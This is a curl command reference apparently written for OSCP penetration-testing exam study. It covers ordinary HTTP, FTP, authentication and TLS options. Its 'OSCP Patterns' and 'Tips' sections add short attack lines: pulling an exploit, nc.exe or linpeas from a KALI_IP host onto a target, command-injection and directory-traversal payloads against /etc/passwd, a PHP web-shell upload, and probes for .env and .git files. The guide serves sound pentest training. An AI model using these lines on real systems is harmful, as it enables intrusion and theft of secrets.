# curl - Complete HTTP/FTP Transfer Tool Guide

## Table of Contents
1. [Installation & Setup](#1-installation--setup)
2. [Basic Concepts](#2-basic-concepts)
3. [HTTP Methods](#3-http-methods)
4. [Authentication](#4-authentication)
5. [Headers & Cookies](#5-headers--cookies)
6. [File Operations](#6-file-operations)
7. [Data Transfer](#7-data-transfer)
8. [Proxy & Tunneling](#8-proxy--tunneling)
9. [SSL/TLS Options](#9-ssltls-options)
10. [Advanced Features](#10-advanced-features)
11. [Common OSCP Patterns](#11-common-oscp-patterns)
12. [Troubleshooting](#12-troubleshooting)
13. [Quick Reference](#13-quick-reference)

---

## 1. Installation & Setup

### 1.1 Installation

```bash
# Kali Linux (bereits installiert)
curl --version

# Debian/Ubuntu
sudo apt install curl
```

### 1.2 Basic Syntax

```bash
curl [options] [URL]
```

---

## 2. Basic Concepts

### 2.1 Simple Requests

```bash
# Basic GET
curl http://example.com

# Save to file
curl http://example.com -o page.html

# Save with original filename
curl http://example.com/file.zip -O

# Follow redirects
curl -L http://example.com

# Verbose output
curl -v http://example.com

# Silent mode
curl -s http://example.com

# Show only response headers
curl -I http://example.com
```

---

## 3. HTTP Methods

### 3.1 GET Request

```bash
# Simple GET
curl http://example.com

# GET with query parameters
curl "http://example.com/api?param1=value1&param2=value2"
```

### 3.2 POST Request

```bash
# POST with data
curl -X POST http://example.com/api -d "key=value"

# POST JSON
curl -X POST http://example.com/api \
  -H "Content-Type: application/json" \
  -d '{"key":"value"}'

# POST form data
curl -X POST http://example.com/login \
  -d "username=admin" \
  -d "password=secret"

# POST from file
curl -X POST http://example.com/api -d @data.json
```

### 3.3 PUT Request

```bash
# PUT with data
curl -X PUT http://example.com/api/user/1 \
  -H "Content-Type: application/json" \
  -d '{"name":"John"}'
```

### 3.4 DELETE Request

```bash
# DELETE
curl -X DELETE http://example.com/api/user/1

# DELETE with authentication
curl -X DELETE http://example.com/api/user/1 \
  -H "Authorization: Bearer TOKEN"
```

---

## 4. Authentication

### 4.1 HTTP Basic Auth

```bash
# Basic Auth
curl -u username:password http://example.com

# Basic Auth (prompt for password)
curl -u username http://example.com
```

### 4.2 HTTP Digest Auth

```bash
# Digest Auth
curl --digest -u username:password http://example.com
```

### 4.3 NTLM Authentication (Windows)

```bash
# NTLM Auth
curl --ntlm -u username:password http://example.com

# NTLM with Domain
curl --ntlm -u 'DOMAIN\username:password' http://example.com
```

### 4.4 Kerberos (Negotiate)

```bash
# Kerberos/SPNEGO (if ticket available)
curl --negotiate -u : http://example.com
```

### 4.5 Bearer Token (API)

```bash
# Bearer Token
curl http://example.com/api \
  -H "Authorization: Bearer YOUR_TOKEN"

# API Key in Header
curl http://example.com/api \
  -H "X-API-Key: YOUR_API_KEY"
```

---

## 5. Headers & Cookies

### 5.1 Custom Headers

```bash
# Single Header
curl -H "User-Agent: Custom-Agent" http://example.com

# Multiple Headers
curl -H "User-Agent: Custom" \
     -H "Accept: application/json" \
     -H "X-Custom-Header: value" \
     http://example.com
```

### 5.2 Common Headers

```bash
# User-Agent
curl -A "Mozilla/5.0" http://example.com

# Referer
curl -e "http://google.com" http://example.com

# Accept
curl -H "Accept: application/json" http://example.com
```

### 5.3 Cookie Management

```bash
# Send Cookie
curl -b "session=abc123" http://example.com

# Save Cookies to file
curl -c cookies.txt http://example.com/login -d "user=admin&pass=secret"

# Use saved cookies
curl -b cookies.txt http://example.com/dashboard
```

---

## 6. File Operations

### 6.1 Download Files

```bash
# Download to file
curl http://example.com/file.zip -o file.zip

# Download with original name
curl http://example.com/file.zip -O

# Resume download
curl -C - http://example.com/bigfile.iso -O
```

### 6.2 Upload Files

```bash
# Upload via POST (multipart/form-data)
curl -F "file=@/path/to/file.txt" http://example.com/upload

# Upload via PUT
curl -T file.txt http://example.com/upload/file.txt
```

### 6.3 FTP Operations

```bash
# FTP Download
curl ftp://ftp.example.com/file.txt -o file.txt

# FTP Upload
curl -T file.txt ftp://ftp.example.com/

# FTP with credentials
curl -u user:pass ftp://ftp.example.com/file.txt -O

# FTP Anonymous
curl -O ftp://anonymous@192.168.185.145/path/to/file

# FTP List directory
curl ftp://ftp.example.com/path/
```

---

## 7. Data Transfer

### 7.1 POST Data

```bash
# URL-encoded data
curl -X POST http://example.com/api -d "key1=value1&key2=value2"

# Data from file
curl -X POST http://example.com/api -d @data.txt
```

### 7.2 JSON Data

```bash
# POST JSON
curl -X POST http://example.com/api \
  -H "Content-Type: application/json" \
  -d '{"name":"John","age":30}'

# JSON from file
curl -X POST http://example.com/api \
  -H "Content-Type: application/json" \
  -d @data.json
```

### 7.3 Form Data

```bash
# Multipart form data
curl -F "field1=value1" -F "field2=value2" http://example.com/form

# File upload in form
curl -F "username=admin" -F "file=@photo.jpg" http://example.com/upload
```

---

## 8. Proxy & Tunneling

### 8.1 HTTP Proxy

```bash
# HTTP Proxy
curl -x http://proxy.example.com:8080 http://target.com

# Proxy with authentication
curl -x http://proxy.example.com:8080 -U user:pass http://target.com

# SOCKS5 Proxy
curl -x socks5://127.0.0.1:1080 http://target.com
```

---

## 9. SSL/TLS Options

### 9.1 Certificate Verification

```bash
# Ignore SSL certificate errors
curl -k https://example.com

# Use specific CA certificate
curl --cacert ca.crt https://example.com

# Use client certificate
curl --cert client.crt --key client.key https://example.com
```

### 9.2 SSL/TLS Versions

```bash
# Force TLS 1.2
curl --tlsv1.2 https://example.com

# Force TLS 1.3
curl --tlsv1.3 https://example.com
```

---

## 10. Advanced Features

### 10.1 Rate Limiting

```bash
# Limit transfer rate
curl --limit-rate 100K http://example.com/bigfile.iso -O

# Max time for operation
curl --max-time 30 http://example.com

# Connection timeout
curl --connect-timeout 10 http://example.com
```

### 10.2 Retry Logic

```bash
# Retry on failure
curl --retry 3 http://example.com

# Retry delay
curl --retry 3 --retry-delay 5 http://example.com
```

---

## 11. Common OSCP Patterns

### 11.1 Pattern 1: Web Enumeration

```bash
# Check if web server is up
curl -I http://192.168.1.10

# Check robots.txt
curl http://192.168.1.10/robots.txt

# Check common files
curl http://192.168.1.10/.git/config
curl http://192.168.1.10/.env
```

### 11.2 Pattern 2: File Download

```bash
# Download exploit from Kali to target
# Kali:
python3 -m http.server 80

# Target (Linux):
curl http://KALI_IP/exploit.sh -o exploit.sh
chmod +x exploit.sh

# Target (Windows):
curl http://KALI_IP/nc.exe -o C:\temp\nc.exe
```

### 11.3 Pattern 3: Command Injection Testing

```bash
# Test command injection
curl "http://192.168.1.10/page.php?cmd=;id"
curl "http://192.168.1.10/page.php?cmd=|whoami"

# With POST
curl -X POST http://192.168.1.10/page.php -d "cmd=;id"
```

### 11.4 Pattern 4: API Interaction

```bash
# GET API endpoint
curl http://192.168.1.10/api/users

# POST to API
curl -X POST http://192.168.1.10/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'
```

### 11.5 Pattern 5: LFI/Directory Traversal

```bash
# Test LFI
curl "http://192.168.1.10/page.php?file=../../../../etc/passwd"

# Windows LFI
curl "http://192.168.1.10/page.php?file=..\..\..\..\windows\win.ini"
```

### 11.6 Pattern 6: File Upload

```bash
# Upload PHP shell
curl -F "file=@shell.php" http://192.168.1.10/upload.php

# Check if uploaded
curl http://192.168.1.10/uploads/shell.php?cmd=id
```

---

## 12. Troubleshooting

### 12.1 Connection Errors

```bash
# Problem: Connection refused
# Increase timeout
curl --connect-timeout 30 --max-time 60 http://192.168.1.10
```

### 12.2 SSL/TLS Errors

```bash
# Problem: SSL certificate verify failed
# Solution: Ignore certificate
curl -k https://192.168.1.10
```

### 12.3 Authentication Issues

```bash
# Check authentication method
curl -v http://192.168.1.10 2>&1 | grep -i "www-authenticate"

# Try different auth methods
curl -u user:pass http://192.168.1.10           # Basic
curl --digest -u user:pass http://192.168.1.10  # Digest
curl --ntlm -u user:pass http://192.168.1.10    # NTLM
```

---

## 13. Quick Reference

### 13.1 Essential Options

```bash
# BASIC
curl URL                      # Simple GET request
curl URL -o file              # Save to file
curl URL -O                   # Save with original name
curl -L URL                   # Follow redirects
curl -v URL                   # Verbose output
curl -s URL                   # Silent mode
curl -I URL                   # HEAD request (headers only)

# HTTP METHODS
curl -X POST URL              # POST request
curl -X PUT URL               # PUT request
curl -X DELETE URL            # DELETE request

# AUTHENTICATION
curl -u user:pass URL         # Basic Auth
curl --digest -u user:pass URL    # Digest Auth
curl --ntlm -u user:pass URL      # NTLM Auth
curl -H "Authorization: Bearer TOKEN" URL  # Bearer Token

# HEADERS & COOKIES
curl -H "Header: value" URL   # Custom header
curl -A "User-Agent" URL      # User-Agent
curl -b "cookie=value" URL    # Send cookie
curl -c cookies.txt URL       # Save cookies
curl -b cookies.txt URL       # Use saved cookies

# DATA
curl -d "data" URL            # POST data
curl -d @file URL             # POST from file
curl -F "field=value" URL     # Form data
curl -F "file=@file" URL      # File upload

# SSL/TLS
curl -k URL                   # Ignore SSL errors
curl --cert cert.pem URL      # Client certificate

# PROXY
curl -x proxy:port URL        # Use proxy
curl -x socks5://proxy:port URL  # SOCKS5 proxy

# ADVANCED
curl --limit-rate 100K URL    # Rate limit
curl --max-time 30 URL        # Timeout
curl --retry 3 URL            # Retry on failure
curl -C - URL -O              # Resume download
```

### 13.2 Common Combinations

```bash
# Download file
curl -L http://example.com/file.zip -o file.zip

# POST JSON with auth
curl -X POST http://example.com/api \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"key":"value"}'

# Upload file
curl -F "file=@document.pdf" http://example.com/upload

# FTP download (anonymous)
curl -O ftp://anonymous@ftp.example.com/file.txt

# Check HTTP status code
curl -s -o /dev/null -w "%{http_code}" http://example.com
```

---

## 14. OSCP Tips

**File Transfer:**
```bash
# Kali:
python3 -m http.server 80

# Target:
curl http://KALI_IP/linpeas.sh -o linpeas.sh
```

**Quick Checks:**
```bash
curl -I http://TARGET_IP                    # Check if up
curl http://TARGET_IP/robots.txt            # Robots
curl http://TARGET_IP/.git/config           # Git config
```

**API Testing:**
```bash
curl http://TARGET_IP/api/v1/users
curl -X POST http://TARGET_IP/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

---

## 15. Resources

- **curl Manual**: https://curl.se/docs/manual.html
- **curl Book**: https://everything.curl.dev/

---

## 16. Final Notes

**Für OSCP:**
- curl = Universal HTTP/FTP Client
- File Transfer: `curl http://KALI/file -o file`
- Ignore SSL: `-k` flag
- Follow Redirects: `-L` flag
- Authentication: `-u user:pass`, `--ntlm`, `--digest`

**Best Practice:**
1. Use `-v` for debugging
2. Save cookies with `-c` for authenticated sessions
3. Use `-s` in scripts (silent mode)
4. Always follow redirects with `-L`
5. Ignore SSL errors with `-k` (pentesting only!)